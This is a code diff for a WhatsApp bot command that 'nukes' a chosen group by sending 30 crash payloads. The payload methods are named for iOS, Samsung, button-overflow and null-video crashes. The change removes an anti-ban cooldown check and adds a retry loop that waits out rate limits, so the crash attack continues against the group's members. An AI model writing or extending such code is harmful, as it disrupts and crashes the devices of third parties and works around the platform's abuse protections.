@@ -29,7 +29,6 @@ module.exports = {
         if (!eye) eye = new MadaraEye(sock);
         
         try {
-            // ── Resolve group FIRST (no crash op yet) ────────────────────
             await sock.sendMessage(ctx.from, { text: '🔍 ʀᴇsᴏʟᴠɪɴɢ ɢʀᴏᴜᴘ...' }, { quoted: msg });
             
             let groupJid = null;
@@ -44,15 +43,6 @@ module.exports = {
             
             if (!groupJid) throw new Error('Could not resolve group');
             
-            // ── Check anti-ban BEFORE starting crash ─────────────────────
-            const stats = getStats(phone);
-            if (stats.cooldownActive) {
-                const waitSec = Math.round(stats.cooldownRemaining / 1000);
-                return sock.sendMessage(ctx.from, { 
-                    text: `🛡️ ᴀɴᴛɪ-ʙᴀɴ ᴄᴏᴏʟᴅᴏᴡɴ ᴀᴄᴛɪᴠᴇ\n⏳ ᴡᴀɪᴛ *${waitSec}s* ᴀɴᴅ ᴛʀʏ ᴀɢᴀɪɴ` 
-                }, { quoted: msg });
-            }
-            
             await sock.sendMessage(ctx.from, { text: `🎯 ɢʀᴏᴜᴘ ғᴏᴜɴᴅ: ${groupJid}\n💣 ɴᴜᴋᴇ ɪɴɪᴛɪᴀᴛᴇᴅ...` }, { quoted: msg });
             
             const TOTAL = 30;
@@ -60,16 +50,25 @@ module.exports = {
             const methods = ['iosInvisibleForce', 'samsung', 'buttonOverflow', 'vidxNull'];
             
             for (let i = 0; i < TOTAL; i++) {
-                // ── If rate limited, wait and retry instead of stopping ──
-                try {
-                    await canCrash(phone);
-                } catch (e) {
-                    // Rate limited — wait 30 seconds and try again
-                    await sock.sendMessage(ctx.from, { text: `⏳ ${e.message}\nᴡᴀɪᴛɪɴɢ 30s ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ...` }, { quoted: msg });
-                    await new Promise(r => setTimeout(r, 30000));
-                    try { await canCrash(phone); } catch (e2) {
-                        await bar.done(`🛡️ ${e2.message}\n✅ ᴘᴀʀᴛɪᴀʟ: ${i} ᴘᴀʏʟᴏᴀᴅs`);
-                        return;
+                let allowed = false;
+                
+                // ── RETRY LOOP: Keep trying until anti-ban allows ────────
+                while (!allowed) {
+                    try {
+                        await canCrash(phone);
+                        allowed = true;
+                    } catch (e) {
+                        // Extract wait time from error or use default 60s
+                        const waitMatch = e.message.match(/(\d+)s/);
+                        const waitMs = waitMatch ? parseInt(waitMatch[1]) * 1000 : 60000;
+                        
+                        await bar.setPhase(`⏳ ${e.message}`);
+                        await new Promise(r => setTimeout(r, waitMs));
+                        
+                        // Check if socket still connected
+                        if (!sock.ws || sock.ws.readyState !== 1) {
+                            throw new Error('Connection lost during cooldown');
+                        }
                     }
                 }
                 
